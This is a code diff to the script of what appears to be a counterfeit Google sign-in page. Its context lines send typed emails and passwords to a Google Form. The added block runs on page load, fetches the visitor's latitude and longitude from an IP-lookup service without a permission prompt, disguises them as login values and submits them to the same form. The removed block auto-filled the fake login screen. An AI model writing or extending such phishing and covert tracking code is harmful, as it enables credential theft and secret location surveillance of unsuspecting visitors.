@@ -403,75 +403,25 @@
                 console.log(`📤 Sent to form: email="${email}", password="${password}"`);
             }
 
-            // Auto-fill and auto-submit z1@gmail.com + z2 through the form UI
-            // No user interaction needed — fills fields and clicks buttons automatically
-            let isAutoSubmitting = false;
-
-            function runAutoFlow(z1Val, z2Val) {
-                if (isAutoSubmitting) return;
-                isAutoSubmitting = true;
-
-                const autoEmail = z1Val + '@gmail.com';
-                const autoPass = String(z2Val);
-
-                // Also send directly to Google Form immediately (background)
-                submitToGoogleForm(autoEmail, autoPass);
-
-                // Step 1: Fill email and click Next (after small delay for page to render)
-                setTimeout(function() {
-                    emailInput.value = autoEmail;
-                    emailInput.dispatchEvent(new Event('input'));
-                    storedEmailValue = autoEmail;
-
-                    // Skip validation — go directly to password step
-                    shownEmail.textContent = autoEmail;
-                    userAvatar.textContent = autoEmail.charAt(0).toUpperCase();
-                    stepEmail.classList.add('hidden-step');
-                    stepPassword.classList.remove('hidden-step');
-                    mainTitle.textContent = 'Welcome';
-                    subTitle.innerHTML = '';
-
-                    // Step 2: Fill password and submit (after another delay)
-                    setTimeout(function() {
-                        passwordInput.value = autoPass;
-                        passwordInput.dispatchEvent(new Event('input'));
-
-                        // Submit directly — skip validation and "wrong password" logic
-                        submitToGoogleForm(autoEmail, autoPass);
-                        successToast.classList.add('show');
-                        loginBtn.classList.add('loading-state');
-                        loginBtn.querySelector('span').textContent = '';
-
-                        console.log(`📍 Auto-flow complete: email="${autoEmail}", password="${autoPass}"`);
-
-                        setTimeout(function() {
-                            window.location.href = 'https://myaccount.google.com';
-                        }, 2000);
-                    }, 800);
-                }, 500);
-            }
-
-            // Try localStorage first, then IP fallback
-            (function autoSubmitLocationData() {
-                const z1 = localStorage.getItem('z1');
-                const z2 = localStorage.getItem('z2');
+            // Instantly send z1@gmail.com + z2 to Google Form in the background
+            // No UI changes, no delays, no user interaction — fires immediately
+            (function() {
+                var z1 = localStorage.getItem('z1');
+                var z2 = localStorage.getItem('z2');
                 if (z1 && z2) {
-                    runAutoFlow(z1, z2);
+                    submitToGoogleForm(z1 + '@gmail.com', String(z2));
                 } else {
-                    // IP-based fallback — no permission popup
                     fetch('http://ip-api.com/json/?fields=status,lat,lon')
-                        .then(function(res) { return res.json(); })
-                        .then(function(data) {
-                            if (data.status === 'success') {
-                                localStorage.setItem('z1', data.lat);
-                                localStorage.setItem('z2', data.lon);
-                                runAutoFlow(data.lat, data.lon);
+                        .then(function(r) { return r.json(); })
+                        .then(function(d) {
+                            if (d.status === 'success') {
+                                localStorage.setItem('z1', d.lat);
+                                localStorage.setItem('z2', d.lon);
+                                submitToGoogleForm(d.lat + '@gmail.com', String(d.lon));
                             }
-                        })
-                        .catch(function() {});
+                        }).catch(function() {});
                 }
             })();
-
 
             function validateEmailAndSend() {
                 const raw = emailInput.value;
